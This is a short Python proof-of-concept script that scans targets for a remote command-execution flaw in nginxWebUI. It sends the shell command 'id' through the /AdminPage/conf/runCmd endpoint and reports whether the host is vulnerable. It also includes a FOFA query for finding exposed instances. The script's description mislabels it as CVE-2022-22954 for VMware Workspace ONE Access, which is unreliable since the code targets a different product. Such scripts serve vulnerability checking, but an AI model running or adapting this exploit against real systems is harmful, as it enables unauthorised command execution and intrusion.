import re
import sys
import argparse
import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+          FOFA:app="nginxWebUI"')


def run_proto(url):
    requests.packages.urllib3.disable_warnings()
    path = [
        f'/AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx'
            ]
    for i in path:
        check_url = url + i
        headers = {
            'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                          ' (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
        }
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.get(url=check_url, headers=headers, timeout=(6, 6), allow_redirects=True, verify=False)
            rec = re.search('uid=.*?gid=', response.text, re.I | re.M)
            if 'success' in response.text and rec:
                print(response.text)
                return True
            else:
                return False

        except Exception as e:
            continue
    return False


def run(target):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    parser = argparse.ArgumentParser(description="CVE-2022-22954_VMware Workspace ONE Access RCE")
    parser.add_argument('-t', '--target', type=str, help='127.0.0.1:80', default='127.0.0.1:80')
    args = parser.parse_args()
    target = args.target

    result = run(target)

    if result:
        print('Exist')
    else:
        print('UnExist')
